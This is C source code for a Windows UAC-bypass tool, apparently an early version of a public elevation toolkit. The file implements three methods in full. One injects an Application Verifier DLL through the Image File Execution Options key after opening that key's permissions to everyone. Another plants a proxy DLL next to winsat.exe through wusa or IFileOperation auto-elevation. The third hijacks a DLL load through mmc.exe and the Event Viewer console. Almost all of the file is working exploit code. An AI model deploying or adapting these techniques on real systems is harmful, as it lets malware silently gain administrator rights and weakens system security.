/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015
*
*  TITLE:       HYBRIDS.C
*
*  VERSION:     1.90
*
*  DATE:        17 Sept 2015
*
*  Hybrid UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"

#define T_IFEO                L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
#define T_AVRFDLL             L"Hibiki.dll"
#define T_AVRF_SOURCEDLL      L"%temp%\\Hibiki.dll"
#define T_AVRF_CMDLINE        L"/c wusa %ws /extract:%%windir%%\\system32"
#define T_WINSATSRC           L"%temp%\\winsat.exe"
#define T_WINSAT_CMDLINE      L"/c wusa %ws /extract:%%windir%%\\system32\\sysprep"
#define T_WINSAT_TARGET       L"%systemroot%\\system32\\sysprep\\winsat.exe"

/*
* ucmAvrfMethod
*
* Purpose:
*
* Acquire elevation through Application Verifier dll injection.
*
*/
BOOL ucmAvrfMethod(
	CONST PVOID AvrfDll,
	DWORD AvrfDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	HKEY hKey = NULL, hSubKey = NULL;
	LRESULT lRet;
	DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
	WCHAR szCmd[MAX_PATH * 4];

	if (
		(AvrfDll == NULL) ||
		(AvrfDllSize == 0)
		)
	{
		return bResult;
	}

	do {

		//
		// Set new key security dacl
		// Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
		//
		if (!ucmSimdaAlterKeySecurity(T_IFEO, T_SDDL_ALL_FOR_EVERYONE)) {
			OutputDebugString(TEXT("[UCM] Failed to alter key security"));
			break;
		}

		//open IFEO key
		lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
			0, KEY_ALL_ACCESS, &hKey);
		if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
			OutputDebugString(TEXT("[UCM] Failed to open IFEO key"));
			break;
		}

		//Set new key and values
		hSubKey = NULL;
		lRet = RegCreateKey(hKey, TEXT("cliconfg.exe"), &hSubKey);
		if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS)) {
			OutputDebugString(TEXT("[UCM] Failed to create IFEO subkey"));
			break;
		}

		lRet = RegSetValueEx(hSubKey, TEXT("GlobalFlag"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
		if (lRet != ERROR_SUCCESS) {
			OutputDebugString(TEXT("[UCM] Failed to set subkey value 1"));
			break;
		}

		dwValue = (DWORD)_strlen(T_AVRFDLL) * sizeof(TCHAR);
		lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&T_AVRFDLL, dwValue);
		if (lRet != ERROR_SUCCESS) {
			OutputDebugString(TEXT("[UCM] Failed to set subkey value 2"));
			break;
		}

		// Cleanup registry, we don't need anymore.
		RegCloseKey(hSubKey);
		hSubKey = NULL;
		RegCloseKey(hKey);
		hKey = NULL;

		//
		// Extract file to the protected directory
		// First, create cab with fake msu ext, second run fusion process.
		//
		if (!ucmCreateCabinetForSingleFile(T_AVRF_SOURCEDLL, AvrfDll, AvrfDllSize)) {
			break;
		}
		// Drop Hibiki to system32
		if (!ucmWusaExtractPackage(T_AVRF_CMDLINE)) {
			OutputDebugString(TEXT("[UCM] Wusa failed copy Hibiki"));
			break;
		}

		// Finally run target fusion process.
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		if (ExpandEnvironmentStringsW(METHOD_SQLSRV_TARGETAPP,
			szCmd, MAX_PATH) == 0)
		{
			break;
		}
		bResult = supRunProcess(szCmd, NULL);

	} while (cond);

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}
	if (hSubKey != NULL) {
		RegCloseKey(hSubKey);
	}
	return bResult;
}

/*
* ucmWinSATMethod
*
* Purpose:
*
* Acquire elevation through abusing APPINFO.DLL whitelisting model logic and wusa installer/IFileOperation autoelevation.
* Slightly modified target and proxydll can work almost with every autoelevated/whitelisted application.
* This method uses advantage of wusa to write to the protected folders, but can be adapted to IFileOperation too.
* WinSAT used for demonstration purposes only.
*
*/
BOOL ucmWinSATMethod(
	LPWSTR lpTargetDll,
	PVOID ProxyDll,
	DWORD ProxyDllSize,
	BOOL UseWusa
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	CABDATA *Cabinet = NULL;
	WCHAR szSource[MAX_PATH + 1];
	WCHAR szDest[MAX_PATH + 1];
	WCHAR szBuffer[MAX_PATH + 1];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0) ||
		(lpTargetDll == NULL) 
		)
	{
		return bResult;
	}

	if (_strlen_w(lpTargetDll) > 100) {
		return bResult;
	}

	RtlSecureZeroMemory(szSource, sizeof(szSource));
	RtlSecureZeroMemory(szDest, sizeof(szDest));

	do {

		if (ExpandEnvironmentStrings(L"%systemroot%\\system32\\winsat.exe",
			szSource, MAX_PATH) == 0)
		{
			break;
		}

		if (ExpandEnvironmentStrings(L"%temp%\\winsat.exe",
			szDest, MAX_PATH) == 0)
		{
			break;
		}

		// Copy winsat to temp directory
		if (!CopyFile(szSource, szDest, FALSE)) {
			break;
		}

		//put target dll
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, TEMPDIR);
		_strcat_w(szBuffer, lpTargetDll);


		//expand string for proxy dll
		RtlSecureZeroMemory(szSource, sizeof(szSource));
		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
			break;
		}

		//write proxy dll to disk
		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
			break;
		}
		else {
			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
		}

		//
		// Two options: use wusa installer or IFileOperation
		//
		if ( UseWusa ) {

			//build cabinet
			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
			if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
				szBuffer, MAX_PATH) == 0)
			{
				break;
			}

			Cabinet = cabCreate(szBuffer);
			if (Cabinet) {

				//expand string for winsat.exe
				if (ExpandEnvironmentStrings(L"%temp%\\winsat.exe",
					szDest, MAX_PATH) == 0)
				{
					break;
				}

				//put proxy dll inside cabinet
				cabAddFile(Cabinet, szSource, lpTargetDll);

				//put winsat.exe
				cabAddFile(Cabinet, szDest, L"winsat.exe");
				cabClose(Cabinet);
				Cabinet = NULL;
			}
			else {
				OutputDebugString(TEXT("[UCM] Error creating cab archive"));
				break;
			}

			//extract package
			ucmWusaExtractPackage(T_WINSAT_CMDLINE);

			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
			if (ExpandEnvironmentStrings(T_WINSAT_TARGET, szBuffer, MAX_PATH) == 0)	{
				break;
			}
			bResult = supRunProcess(szBuffer, NULL);
		}
		else {

			//wusa extract banned, switch to IFileOperation.
			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
			if (ExpandEnvironmentStringsW(M1W7_TARGETDIR, 
				szBuffer, MAX_PATH) == 0)
			{
				break;
			}
			bResult = ucmAutoElevateCopyFile(szSource, szBuffer);
			if (!bResult) {
				break;
			}
			bResult = ucmAutoElevateCopyFile(szDest, szBuffer);
			if (!bResult) {
				break;
			}
			
			Sleep(0);

			//run winsat
			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
			if (ExpandEnvironmentStrings(T_WINSAT_TARGET, szBuffer, MAX_PATH) == 0)	{
				break;
			}
			bResult = supRunProcess(szBuffer, NULL);
			//cleanup of the above files must be done by payload code
		}

	} while (cond);

	if (Cabinet) {
		cabClose(Cabinet);
	}
	//remove trash from %temp%
	if (szDest[0] != 0) {
		DeleteFileW(szDest);
	}
	if (szSource[0] != 0) {
		DeleteFileW(szSource);
	}

	return bResult;
}

/*
* ucmMMCMethod
*
* Purpose:
*
* Bypass UAC by abusing MMC.exe backdoor hardcoded in appinfo.dll
*
*/
BOOL ucmMMCMethod(
	LPWSTR lpTargetDll,
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	WCHAR szSource[MAX_PATH + 1];
	WCHAR szDest[MAX_PATH + 1];
	WCHAR szBuffer[MAX_PATH + 1];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0) ||
		(lpTargetDll == NULL)
		)
	{
		return bResult;
	}

	if (_strlen_w(lpTargetDll) > 100) {
		return bResult;
	}

	RtlSecureZeroMemory(szSource, sizeof(szSource));
	RtlSecureZeroMemory(szDest, sizeof(szDest));

	do {

		//put target dll
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, TEMPDIR);
		_strcat_w(szBuffer, lpTargetDll);

		//expand string for proxy dll
		RtlSecureZeroMemory(szSource, sizeof(szSource));
		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
			break;
		}

		//write proxy dll to disk
		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
			break;
		}
		else {
			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
		}

		//expand string for target dir
		RtlSecureZeroMemory(szDest, sizeof(szDest));
		if (ExpandEnvironmentStringsW(SYSTEMROOTDIR,
			szDest, MAX_PATH) == 0)
		{
			break;
		}

		//drop fubuki to system32
		bResult = ucmAutoElevateCopyFile(szSource, szDest);
		if (!bResult) {
			break;
		}

		//run mmc console
		//because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command
		//event viewer will attempt to load not existing dll, so we will give him our little friend
		bResult = supRunProcess(L"mmc.exe", L"eventvwr.msc");

	} while (cond);

	return bResult;
}
